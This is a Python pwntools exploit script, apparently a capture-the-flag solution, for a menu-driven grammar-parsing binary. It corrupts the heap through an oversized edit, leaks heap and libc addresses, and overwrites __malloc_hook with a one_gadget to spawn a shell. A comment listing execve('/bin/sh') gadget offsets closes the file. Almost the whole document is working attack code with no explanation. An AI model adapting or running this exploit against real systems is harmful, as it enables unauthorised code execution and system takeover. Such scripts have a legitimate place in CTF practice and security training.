#coding=utf-8
from pwn import *
local = 1
exec_file="./pwn"
context.binary=exec_file
context.terminal=["tmux","splitw","-h"]
elf=ELF(exec_file,checksec = False)
if local :
    a=process(exec_file)
    if context.arch == "i386" :
        libc=ELF("/lib/i386-linux-gnu/libc.so.6",checksec = False)
    elif context.arch == "amd64" :
        libc=ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec = False) 
else:
    a=remote("127.0.0.1"，8888)
    libc = ELF("./libc.so.6")
def get_base(a):
    text_base = a.libs()[a._cwd+a.argv[0].strip('.')]
    for key in a.libs():
        if "libc.so.6" in key:
            return text_base,a.libs()[key]
def debug():
    text_base,libc_base=get_base(a)
    script="set $text_base="+str(text_base)+'\n'+"set $libc_base="+str(libc_base)+'\n'
    script+='''
    b *($text_base+0x00000000000C103)
    '''
    gdb.attach(a,script)
def fuck(address):
    n = globals()
    for key,value in n.items():
        if value == address:
            return success(key+"  ==>  "+hex(address))
def menu(idx):
    a.sendlineafter("your choice:",str(idx))
def add(content):
    menu(1)
    a.recvuntil("Input grammar:")
    a.send(content)

def show():
    menu(2)

def edit(old,len,payload):
    menu(4)
    a.sendlineafter("Non-Terminal:",old)
    a.sendlineafter("size:",str(len))
    sleep(0.2)
    a.send(payload)

#p *(Info*)(0x555555554000+0x213380)

grammar =  "A -> B C \n"
grammar += "B -> a \n"
grammar += "B -> $ \n"
grammar += "C"*0x17+" -> bbbbbb \n"
grammar += "exit\n"
add(grammar)

payload = 'C'*0x17+'\x00'
payload += p64(0x21)+'\x00'*0x10+p64(0)+p64(0x31)+'\x00'*0x28
payload += p64(0x31)+'\x38'
edit("C"*0x17,0x100000000,payload)
show()
a.recvuntil("CCCCCCCCCCCCCCCCCCCCCCC -> ")
heap_addr = u64(a.recv(6)+'\x00\x00')
fuck(heap_addr)

menu(4)
a.sendlineafter("Non-Terminal:",'A'*0x100)

target_addr = heap_addr+0x3a0
fuck(target_addr)

payload = 'C'*0x17+'\x00'
payload += p64(0x51)+p64(heap_addr+0x340)
payload += p64(heap_addr+0x40)+p64(0x21)*8
#payload += '\x00'*0x40
payload += p64(target_addr)
edit("C"*0x17,0x100000000,payload)
show()
a.recvuntil("CCCCCCCCCCCCCCCCCCCCCCC -> ")
libc_addr = u64(a.recv(6)+'\x00\x00')-152-libc.symbols["__malloc_hook"]-0x10
fuck(libc_addr)


system_addr = libc_addr+0xf0364
realloc = libc_addr+libc.symbols["realloc"]

payload = 'B'*1+'\x00'*15
payload += p64(heap_addr+0x90)+p64(heap_addr+0xd0)*2
payload += p64(libc_addr+libc.symbols["__malloc_hook"]-0x1b)+p64(35)
edit("A",0x100000000,payload)

payload = '\x00'*(0x1b-8)+p64(system_addr)+p64(realloc)[:6]
name = "\x7f"+'\x00\x00'
name += p64(0)+p64(libc_addr+0x85ea0)+p64(libc_addr+0x85a70)+'\x00'*8
print len(name)
edit(name,34,payload)

menu(4)
a.sendlineafter("Non-Terminal:",'A'*0x100)


a.interactive()

'''
0x45226 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4527a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf0364 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1207 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''


